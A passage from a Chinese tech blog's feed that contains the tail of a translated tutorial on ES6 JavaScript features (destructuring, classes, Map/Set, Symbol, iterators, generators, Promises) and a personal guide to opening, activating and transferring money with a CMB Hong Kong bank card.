对象和数组解构</h3><p>解构可以避免在对象赋值时产生中间变量：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">foo</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> arr = <span class="title function_">foo</span>(); <span class="comment">// [1,2,3]</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> [a, b, c] = <span class="title function_">foo</span>();</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(a, b, c); <span class="comment">// 1 2 3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">bar</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> &#123;</span><br><span class="line">    <span class="attr">x</span>: <span class="number">4</span>,</span><br><span class="line">    <span class="attr">y</span>: <span class="number">5</span>,</span><br><span class="line">    <span class="attr">z</span>: <span class="number">6</span></span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> &#123;<span class="attr">x</span>: x, <span class="attr">y</span>: y, <span class="attr">z</span>: z&#125; = <span class="title function_">bar</span>();</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(x, y, z); <span class="comment">// 4 5 6</span></span><br></pre></td></tr></table></figure><h3 id="8-对象超类"><a href="#8-对象超类" class="headerlink" title="8. 对象超类"></a>8. 对象超类</h3><p>ES6 允许在对象中使用 <code>super</code> 方法：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> parent = &#123;</span><br><span class="line">  <span class="title function_">foo</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Hello from the Parent&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> child = &#123;</span><br><span class="line">  <span class="title function_">foo</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">super</span>.<span class="title function_">foo</span>();</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Hello from the Child&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title class_">Object</span>.<span class="title function_">setPrototypeOf</span>(child, parent);</span><br><span class="line">child.<span class="title function_">foo</span>(); <span class="comment">// Hello from the Parent</span></span><br><span class="line">             <span class="comment">// Hello from the Child</span></span><br></pre></td></tr></table></figure><h3 id="9-模板语法和分隔符"><a href="#9-模板语法和分隔符" class="headerlink" title="9. 模板语法和分隔符"></a>9. 模板语法和分隔符</h3><p>ES6 中有一种十分简洁的方法组装一堆字符串和变量。</p><ul><li><code>$&#123; ... &#125;</code> 用来渲染一个变量</li><li>&#96; 作为分隔符</li></ul><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> user = <span class="string">&#x27;Barret&#x27;</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Hi <span class="subst">$&#123;user&#125;</span>!`</span>); <span class="comment">// Hi Barret!</span></span><br></pre></td></tr></table></figure><h3 id="10-for-of-VS-for-in"><a href="#10-for-of-VS-for-in" class="headerlink" title="10. for...of VS for...in"></a>10. <code>for...of</code> VS <code>for...in</code></h3><p><code>for...of</code> 用于遍历一个迭代器，如数组：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> nicknames = [<span class="string">&#x27;di&#x27;</span>, <span class="string">&#x27;boo&#x27;</span>, <span class="string">&#x27;punkeye&#x27;</span>];</span><br><span class="line">nicknames.<span class="property">size</span> = <span class="number">3</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> nickname <span class="keyword">of</span> nicknames) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(nickname);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title class_">Result</span>: di, boo, punkeye</span><br></pre></td></tr></table></figure><p><code>for...in</code> 用来遍历对象中的属性：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> nicknames = [<span class="string">&#x27;di&#x27;</span>, <span class="string">&#x27;boo&#x27;</span>, <span class="string">&#x27;punkeye&#x27;</span>];</span><br><span class="line">nicknames.<span class="property">size</span> = <span class="number">3</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> nickname <span class="keyword">in</span> nicknames) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(nickname);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title class_">Result</span>: <span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, size</span><br></pre></td></tr></table></figure><h3 id="11-Map-和-WeakMap"><a href="#11-Map-和-WeakMap" class="headerlink" title="11. Map 和 WeakMap"></a>11. Map 和 WeakMap</h3><p>ES6 中两种新的数据结构集：<code>Map</code> 和 <code>WeakMap</code>。事实上每个对象都可以看作是一个 <code>Map</code>。</p><p>一个对象由多个 key-val 对构成，在 <code>Map</code> 中，任何类型都可以作为对象的 key，如：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> myMap = <span class="keyword">new</span> <span class="title class_">Map</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> keyString = <span class="string">&quot;a string&quot;</span>,</span><br><span class="line">    keyObj = &#123;&#125;,</span><br><span class="line">    keyFunc = <span class="keyword">function</span> (<span class="params"></span>) &#123;&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置值</span></span><br><span class="line">myMap.<span class="title function_">set</span>(keyString, <span class="string">&quot;value 与 &#x27;a string&#x27; 关联&quot;</span>);</span><br><span class="line">myMap.<span class="title function_">set</span>(keyObj, <span class="string">&quot;value 与 keyObj 关联&quot;</span>);</span><br><span class="line">myMap.<span class="title function_">set</span>(keyFunc, <span class="string">&quot;value 与 keyFunc 关联&quot;</span>);</span><br><span class="line"></span><br><span class="line">myMap.<span class="property">size</span>; <span class="comment">// 3</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取值</span></span><br><span class="line">myMap.<span class="title function_">get</span>(keyString);    <span class="comment">// &quot;value 与 &#x27;a string&#x27; 关联&quot;</span></span><br><span class="line">myMap.<span class="title function_">get</span>(keyObj);       <span class="comment">// &quot;value 与 keyObj 关联&quot;</span></span><br><span class="line">myMap.<span class="title function_">get</span>(keyFunc);      <span class="comment">// &quot;value 与 keyFunc 关联&quot;</span></span><br></pre></td></tr></table></figure><p><strong>WeakMap</strong></p><p><code>WeakMap</code> 就是一个 Map，只不过它的所有 key 都是弱引用，意思就是 WeakMap 中的东西垃圾回收时不考虑，使用它不用担心内存泄漏问题。</p><p>另一个需要注意的点是，<code>WeakMap</code> 的所有 key 必须是对象。它只有四个方法 <code>delete(key)</code>,<code>has(key)</code>,<code>get(key)</code> 和 <code>set(key, val)</code>：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> w = <span class="keyword">new</span> <span class="title class_">WeakMap</span>();</span><br><span class="line">w.<span class="title function_">set</span>(<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>); </span><br><span class="line"><span class="comment">// Uncaught TypeError: Invalid value used as weak map key</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> o1 = &#123;&#125;,</span><br><span class="line">    o2 = <span class="keyword">function</span>(<span class="params"></span>)&#123;&#125;,</span><br><span class="line">    o3 = <span class="variable language_">window</span>;</span><br><span class="line"></span><br><span class="line">w.<span class="title function_">set</span>(o1, <span class="number">37</span>);</span><br><span class="line">w.<span class="title function_">set</span>(o2, <span class="string">&quot;azerty&quot;</span>);</span><br><span class="line">w.<span class="title function_">set</span>(o3, <span class="literal">undefined</span>);</span><br><span class="line"></span><br><span class="line">w.<span class="title function_">get</span>(o3); <span class="comment">// undefined, because that is the set value</span></span><br><span class="line"></span><br><span class="line">w.<span class="title function_">has</span>(o1); <span class="comment">// true</span></span><br><span class="line">w.<span class="title function_">delete</span>(o1);</span><br><span class="line">w.<span class="title function_">has</span>(o1); <span class="comment">// false</span></span><br></pre></td></tr></table></figure><h3 id="12-Set-和-WeakSet"><a href="#12-Set-和-WeakSet" class="headerlink" title="12. Set 和 WeakSet"></a>12. Set 和 WeakSet</h3><p><code>Set</code> 对象是一组不重复的值，重复的值将被忽略，值类型可以是原始类型和引用类型：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> mySet = <span class="keyword">new</span> <span class="title class_">Set</span>([<span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">3</span>]);</span><br><span class="line">mySet.<span class="property">size</span>; <span class="comment">// 3</span></span><br><span class="line">mySet.<span class="title function_">has</span>(<span class="number">1</span>); <span class="comment">// true</span></span><br><span class="line">mySet.<span class="title function_">add</span>(<span class="string">&#x27;strings&#x27;</span>);</span><br><span class="line">mySet.<span class="title function_">add</span>(&#123; <span class="attr">a</span>: <span class="number">1</span>, <span class="attr">b</span>:<span class="number">2</span> &#125;);</span><br></pre></td></tr></table></figure><p>可以通过 <code>forEach</code> 和 <code>for...of</code> 来遍历 <code>Set</code> 对象：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">mySet.<span class="title function_">forEach</span>(<span class="function">(<span class="params">item</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(item);</span><br><span class="line">    <span class="comment">// 1</span></span><br><span class="line">    <span class="comment">// 2</span></span><br><span class="line">    <span class="comment">// 3</span></span><br><span class="line">    <span class="comment">// &#x27;strings&#x27;</span></span><br><span class="line">    <span class="comment">// Object &#123; a: 1, b: 2 &#125;</span></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> value <span class="keyword">of</span> mySet) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(value);</span><br><span class="line">    <span class="comment">// 1</span></span><br><span class="line">    <span class="comment">// 2</span></span><br><span class="line">    <span class="comment">// 3</span></span><br><span class="line">    <span class="comment">// &#x27;strings&#x27;</span></span><br><span class="line">    <span class="comment">// Object &#123; a: 1, b: 2 &#125;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Set 同样有 <code>delete()</code> 和 <code>clear()</code> 方法。</p><p><strong>WeakSet</strong></p><p>类似于 <code>WeakMap</code>，<code>WeakSet</code> 对象可以让你在一个集合中保存对象的弱引用，在 <code>WeakSet</code> 中的对象只允许出现一次：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> ws = <span class="keyword">new</span> <span class="title class_">WeakSet</span>();</span><br><span class="line"><span class="keyword">var</span> obj = &#123;&#125;;</span><br><span class="line"><span class="keyword">var</span> foo = &#123;&#125;;</span><br><span class="line"></span><br><span class="line">ws.<span class="title function_">add</span>(<span class="variable language_">window</span>);</span><br><span class="line">ws.<span class="title function_">add</span>(obj);</span><br><span class="line"></span><br><span class="line">ws.<span class="title function_">has</span>(<span class="variable language_">window</span>); <span class="comment">// true</span></span><br><span class="line">ws.<span class="title function_">has</span>(foo);    <span class="comment">// false, foo 没有添加成功</span></span><br><span class="line"></span><br><span class="line">ws.<span class="title function_">delete</span>(<span class="variable language_">window</span>); <span class="comment">// 从结合中删除 window 对象</span></span><br><span class="line">ws.<span class="title function_">has</span>(<span class="variable language_">window</span>);    <span class="comment">// false, window 对象已经被删除</span></span><br></pre></td></tr></table></figure><h3 id="13-类"><a href="#13-类" class="headerlink" title="13. 类"></a>13. 类</h3><p>ES6 中有 class 语法。值得注意是，这里的 class 不是新的对象继承模型，它只是原型链的语法糖表现形式。</p><p>函数中使用 <code>static</code> 关键词定义构造函数的的方法和属性：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Task</span> &#123;</span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;task instantiated!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="title function_">showId</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">23</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">static</span> <span class="title function_">loadAll</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Loading all tasks..&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="keyword">typeof</span> <span class="title class_">Task</span>); <span class="comment">// function</span></span><br><span class="line"><span class="keyword">let</span> task = <span class="keyword">new</span> <span class="title class_">Task</span>(); <span class="comment">// &quot;task instantiated!&quot;</span></span><br><span class="line">task.<span class="title function_">showId</span>(); <span class="comment">// 23</span></span><br><span class="line"><span class="title class_">Task</span>.<span class="title function_">loadAll</span>(); <span class="comment">// &quot;Loading all tasks..&quot;</span></span><br></pre></td></tr></table></figure><p>类中的继承和超集：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Car</span> &#123;</span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Creating a new car&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Porsche</span> <span class="keyword">extends</span> <span class="title class_ inherited__">Car</span> &#123;</span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">super</span>();</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Creating Porsche&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> c = <span class="keyword">new</span> <span class="title class_">Porsche</span>();</span><br><span class="line"><span class="comment">// Creating a new car</span></span><br><span class="line"><span class="comment">// Creating Porsche</span></span><br></pre></td></tr></table></figure><p><code>extends</code> 允许一个子类继承父类，需要注意的是，子类的 <code>constructor</code> 函数中需要执行 <code>super()</code> 函数。</p><p>当然，你也可以在子类方法中调用父类的方法，如 <code>super.parentMethodName()</code>。</p><p>在 <a href="//developer.mozilla.org/en/docs/Web/JavaScript/Reference/Classes">这里</a> 阅读更多关于类的介绍。</p><p>有几点值得注意的是：</p><ul><li>类的声明不会提升（hoisting)，如果你要使用某个 Class，那你必须在使用之前定义它，否则会抛出一个 <code>ReferenceError</code> 的错误</li><li>在类中定义函数不需要使用 <code>function</code> 关键词</li></ul><h3 id="14-Symbol"><a href="#14-Symbol" class="headerlink" title="14. Symbol"></a>14. Symbol</h3><p><code>Symbol</code> 是一种新的数据类型，它的值是唯一的，不可变的。ES6 中提出 symbol 的目的是为了生成一个唯一的标识符，不过你访问不到这个标识符：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> sym = <span class="title class_">Symbol</span>( <span class="string">&quot;some optional description&quot;</span> );</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="keyword">typeof</span> sym); <span class="comment">// symbol</span></span><br></pre></td></tr></table></figure><p>注意，这里 Symbol 前面不能使用 <code>new</code> 操作符。</p><p>如果它被用作一个对象的属性，那么这个属性会是不可枚举的：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> o = &#123;</span><br><span class="line">    <span class="attr">val</span>: <span class="number">10</span>,</span><br><span class="line">    [ <span class="title class_">Symbol</span>(<span class="string">&quot;random&quot;</span>) ]: <span class="string">&quot;I&#x27;m a symbol&quot;</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Object</span>.<span class="title function_">getOwnPropertyNames</span>(o)); <span class="comment">// val</span></span><br></pre></td></tr></table></figure><p>如果要获取对象 symbol 属性，需要使用 <code>Object.getOwnPropertySymbols(o)</code>。</p><h3 id="15-迭代器（Iterators）"><a href="#15-迭代器（Iterators）" class="headerlink" title="15. 迭代器（Iterators）"></a>15. 迭代器（Iterators）</h3><p>迭代器允许每次访问数据集合的一个元素，当指针指向数据集合最后一个元素是，迭代器便会退出。它提供了 <code>next()</code> 函数来遍历一个序列，这个方法返回一个包含 <code>done</code> 和 <code>value</code> 属性的对象。</p><p>ES6 中可以通过 <code>Symbol.iterator</code> 给对象设置默认的遍历器，无论什么时候对象需要被遍历，执行它的 <code>@@iterator</code> 方法便可以返回一个用于获取值的迭代器。</p><p>数组默认就是一个迭代器：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = [<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>];</span><br><span class="line"><span class="keyword">var</span> itr = arr[<span class="title class_">Symbol</span>.<span class="property">iterator</span>]();</span><br><span class="line"></span><br><span class="line">itr.<span class="title function_">next</span>(); <span class="comment">// &#123; value: 11, done: false &#125;</span></span><br><span class="line">itr.<span class="title function_">next</span>(); <span class="comment">// &#123; value: 12, done: false &#125;</span></span><br><span class="line">itr.<span class="title function_">next</span>(); <span class="comment">// &#123; value: 13, done: false &#125;</span></span><br><span class="line"></span><br><span class="line">itr.<span class="title function_">next</span>(); <span class="comment">// &#123; value: undefined, done: true &#125;</span></span><br></pre></td></tr></table></figure><p>你可以通过 <code>[Symbol.iterator]()</code> 自定义一个对象的迭代器。</p><h3 id="16-Generators"><a href="#16-Generators" class="headerlink" title="16. Generators"></a>16. Generators</h3><p>Generator 函数是 ES6 的新特性，它允许一个函数返回的可遍历对象生成多个值。</p><p>在使用中你会看到 <code>*</code> 语法和一个新的关键词 <code>yield</code>:</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> *<span class="title function_">infiniteNumbers</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> n = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">while</span> (<span class="literal">true</span>)&#123;</span><br><span class="line">    <span class="keyword">yield</span> n++;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> numbers = <span class="title function_">infiniteNumbers</span>(); <span class="comment">// returns an iterable object</span></span><br><span class="line"></span><br><span class="line">numbers.<span class="title function_">next</span>(); <span class="comment">// &#123; value: 1, done: false &#125;</span></span><br><span class="line">numbers.<span class="title function_">next</span>(); <span class="comment">// &#123; value: 2, done: false &#125;</span></span><br><span class="line">numbers.<span class="title function_">next</span>(); <span class="comment">// &#123; value: 3, done: false &#125;</span></span><br></pre></td></tr></table></figure><p>每次执行 yield 时，返回的值变为迭代器的下一个值。</p><h3 id="17-Promises"><a href="#17-Promises" class="headerlink" title="17. Promises"></a>17. Promises</h3><p>ES6 对 Promise 有了原生的支持，一个 Promise 是一个等待被异步执行的对象，当它执行完成后，其状态会变成 <code>resolved</code> 或者 <code>rejected</code>。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> p = <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="keyword">function</span>(<span class="params">resolve, reject</span>) &#123;  </span><br><span class="line">  <span class="keyword">if</span> (<span class="comment">/* condition */</span>) &#123;</span><br><span class="line">    <span class="comment">// fulfilled successfully</span></span><br><span class="line">    <span class="title function_">resolve</span>(<span class="comment">/* value */</span>);  </span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// error, rejected</span></span><br><span class="line">    <span class="title function_">reject</span>(<span class="comment">/* reason */</span>);  </span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>每一个 Promise 都有一个 <code>.then</code> 方法，这个方法接受两个参数，第一个是处理 resolved 状态的回调，一个是处理 rejected 状态的回调：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">p.<span class="title function_">then</span>(<span class="function">(<span class="params">val</span>) =&gt;</span> <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Promise Resolved&quot;</span>, val),</span><br><span class="line">       <span class="function">(<span class="params">err</span>) =&gt;</span> <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Promise Rejected&quot;</span>, err));</span><br></pre></td></tr></table></figure><h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>我很少翻译文章，因为我觉得英文是工程师的标配，所以那些还在依托人家翻译吸收新知识的同学，要好好把基础英语学好；）</p><p>翻译基本按照原文行文，后面几个小结略有删减和修改，不影响阅读。如解释不当，烦请指出。</p>]]></content>
      
      
      <categories>
          
          <category> 前端杂烩 </category>
          
          <category> JavaScript </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ES6 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>招行香港一卡通办理和使用</title>
      <link href="/blog/2016/07/07/hongkong-cmbchina/"/>
      <url>/blog/2016/07/07/hongkong-cmbchina/</url>
      
        <content type="html"><![CDATA[<p>最近办了一张招行香港一卡通，流程比较长，遇到的问题也很多，趁着自己还记得比较清楚，写下来备忘。</p><p><img src="/../blogimgs/2016/07/07/TB1oXtxKVXXXXXDXVXXXXXXXXXX-581-431.png" alt="香港招行一卡通"><!--<source src="https://img.alicdn.com/tfs/TB1oXtxKVXXXXXDXVXXXXXXXXXX-581-431.png">--></p><p>这张卡有什么用，<a href="//www.douban.com/group/topic/36627938/">这篇豆瓣帖子</a> 可以解决你的疑惑。</p><span id="more"></span><h3 id="香港一卡通的申请"><a href="#香港一卡通的申请" class="headerlink" title="香港一卡通的申请"></a>香港一卡通的申请</h3><p>需要准备的东西：</p><ul><li>身份证（以及正反复印件）</li><li>港澳通行证（以及有头像页复印件），貌似护照也是可以的</li><li>招行卡（需要金卡，以及证明复印件）</li><li>居住地证明（我用的是暂居证，注意看看有没有过期，暂居证有效期是 1 年）</li></ul><p>过程中会让你多次输入密码，这些是香港一卡通的查询密码和转账密码。如果你之前没有 Ukey，还需要办理 Ukey，一个 USB 接口的 U 盾，用于香港招行 PC 客户端登录，20 元。</p><p>最后，受理人员会给你一张红色纸张的回单，回单有两个作用：</p><ul><li>回单上有受理分行和经办人员信息，可以联系他们查询进度</li><li>回单上有网上银行授权码（16 位），记得保存，使用 Ukey 登录客户端时需要使用，作用是关联你的 Ukey</li></ul><p>可以跟办理人员说加急处理，处理时间大约一周，卡片办好之后邮寄回来大概三五天，香港银行那边采用的 EMS 邮寄的。</p><h3 id="香港一卡通激活"><a href="#香港一卡通激活" class="headerlink" title="香港一卡通激活"></a>香港一卡通激活</h3><p><strong>1. 激活流程</strong></p><ul><li>电话到 95555，[1] 自助语音 -&gt; 输入香港一卡通卡号 -&gt; 查询密码 -&gt; [1] 账户管理 -&gt; [6] 卡片激活</li><li>激活过程中会提示你输入账户号，这里不是你的身份证号码，而是港澳通行证号码</li><li>激活后需要在 50 天内使用同名账户（也就是你的其他银行卡）转入一笔钱到账户，否则账户处于冻结状态（资金能够转入，但是为冻结状态），同名账户转账入账后自动解冻。</li><li>香港一卡通是会收取账户管理费用的，每月大概 15 HKD。</li></ul><p><strong>2. 转账解冻</strong></p><p>内地账户转账到香港账户，不能转人民币，只能是港币或者美金。首先需要兑换外币，然后转过去。</p><ul><li>登录网上银行，点击横排菜单“外汇管理”-“外汇购汇”后会显示您的人民币子账户，前面“操作”下有蓝色的“购汇”两个字，点击”购汇”。<br>提醒：若购汇后需要汇出，建议选择“现汇”；</li><li>汇到香港一卡通，选择“外汇管理”-“境外汇款”-“汇到香港一卡通”的界面上进行操作转出，需要注意的是，每次转到香港一卡通都需要 200 人民币的手续费，所以不要傻傻地只转一百两百，这样太不划算了。</li><li>转账完成后，第二天账户才会解冻</li></ul><h3 id="香港一卡通转账到内地"><a href="#香港一卡通转账到内地" class="headerlink" title="香港一卡通转账到内地"></a>香港一卡通转账到内地</h3><p>上面已经说了，网页版是没法使用的，需要下载客户端。</p><ul><li>去 <a href="http://hb.cmbchina.com/">网页上</a> 右侧的「个人网银专业版」下载 PC 客户端，只能通过客户端操作，并且只支持 windows 系统。我是 Mac 系统，无奈使用 Parallels 虚拟机操作，插入 Ukey 时 Parallels 会提示插入设备指向 Mac 还是虚拟机，毫无疑问选择虚拟机；）</li><li>这里会用到「香港一卡通申请」步骤中回单上的授权码（所以，整个环节手机记得多拍照）</li><li>登录进去之后，后面就简单了</li></ul><h3 id="与在线客服的问答"><a href="#与在线客服的问答" class="headerlink" title="与在线客服的问答"></a>与在线客服的问答</h3><p><strong>1. 如何获取现汇？</strong></p><p>若您的开户证件为身份证（不包括临时身份证），可以通过网上银行办理购汇，每人每年等值5万美元（含）的结售汇额度。</p><p>操作方法：请您登录网上银行，点击横排菜单“外汇管理”-“外汇购汇”后会显示您的人民币子账户，前面“操作”下有蓝色的“购汇”两个字，点击”购汇”。</p><p>提醒：若您购汇后需要汇出，建议您选择“现汇”；</p><p><strong>2. 如何将现汇转账到香港一卡通？</strong></p><p>您汇到香港一卡通的话，选择“外汇管理”-“境外汇款”-“汇到香港一卡通”的界面上进行操作转出</p><p><strong>3. 香港一卡通转到内地一卡通手续费？</strong></p><p> 通过香港网银把香港账户港币&#x2F;美金汇往内地一卡通有两种方式供您选择：</p><ul><li>【汇往内地同名招行账户】(1)若以人民币入账:请登陆香港分行网银专业版菜单“银行业务”→“货币兑换”→“香港港币美元兑换内地人民币”操作。该方式不收取手续费，但是会占用您每人每年等值5万美金的结汇额度。</li><li>(2)若是以原币种入账，请登陆香港分行网银专业版菜单“银行业务”→“转账汇款”→“至内地港币美元汇款”操作。该种方式会收取每笔11美金或80港币的手续费。</li></ul><p><strong>4. 如果未操作同名账户转账，即账户未激活，会有什么问题？</strong></p><p>您好，若您的香港一卡通是通过境内见证网点开户的，您是需要在开户成功后二个月内操作一笔同名账户转账激活账户。若是二个月内没有同名转账记录，账户将被取消。若是二个月内没有同名转账，但有其它资金入帐的话，账户是会被冻结，直到有同名账户转账资金入帐后才能解冻。</p><p><strong>5. 香港一卡通账户管理计费情况？</strong></p><p>香港一卡通按月收取账户管理费，管理费的标准为HKD15&#x2F;月。若您选择收取电子结单，则账户管理费将优惠至HKD8&#x2F;月。账户开户达到三个完整的日历月份，于第4个日历月份开始，固定每月5日扣收账户管理费，之后固定于每月5日扣收上月管理费；系统自动每月5号扣收，不管是否为香港公众假期。若收取管理费月份向前推算三个日历月份之日均总资产达到等值港币10万则免收客户当月管理费。</p><p><strong>6. 香港一卡通账户欠费会有什么问题？</strong></p><p>若您香港一卡通活期账户内没有资金结余，我行将无法正常扣收账户管理费，且会在系统内记录欠费，等待您活期账户有资金时再扣除有关费用并清除相应欠费。如果欠费超过120天，香港分行将会进行批量关户。</p><p><strong>7. 您的香港一卡通账户管理费收费将于2023年09月优惠到期</strong></p><p>最近看到好几个朋友存在这个问题的疑问，我在 2022 年的这个找招行的客服询问过，给出的回复如下：</p><p><img src="/../blogimgs/2023/09/12/bank.png" alt="CMB Bank"></p><p>如果你们公司跟招行（之前）存在合作，那无论你的账户里存在多少钱，每个月的管理费都是 10 港币。</p><h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>遇到疑问两个联系入口：</p><ul><li>95555 电话联系客服，需要输入一堆信息，我觉得效率不如下面方式高</li><li>进入 <a href="http://www.cmbchina.com/">官网</a>，点击右上角在线客服，很靠谱 👍</li></ul>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
          <category> 在路上 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 招行香港一卡通 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>谈一谈越来越难做的前端</title>
      <link href="/blog/2016/06/13/talk-about-front-end/"/>
      <url>/blog/2016/06/13/talk-about-front-end/</url>
      
